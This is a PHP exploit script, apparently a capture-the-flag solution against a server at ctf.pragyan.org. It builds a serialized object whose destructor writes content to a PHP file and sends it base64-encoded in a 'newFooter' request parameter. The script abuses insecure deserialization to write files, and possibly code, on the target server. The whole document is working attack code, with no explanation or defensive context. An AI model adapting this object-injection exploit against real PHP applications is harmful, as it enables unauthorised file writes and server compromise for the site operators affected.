<?php

class pageContent{
    private $file_name;
    private $newContent;

    function __construct() 
    { 
        // $this->file_name="txt/content.txt"; 
        $this->file_name="txt/fontent.php"; 
        // $this->file_name="txt/lontent.php"; 
        $file = file_get_contents($this->file_name);
        $this->newContent=$file;
    } 

    function setContent($newContent){
        $this->newContent=$newContent;
    }

    function __destruct() 
    { 
        $fd=fopen($this->file_name,"w");
        fwrite($fd,$this->newContent);
        fclose($fd);
    } 
}


$pc = new pageContent();
$serialized = serialize($pc);
$encoded = base64_encode($serialized);
$res = file_get_contents('http://ctf.pragyan.org:9000/index.php?newFooter=' . $encoded);
echo $res;
?>
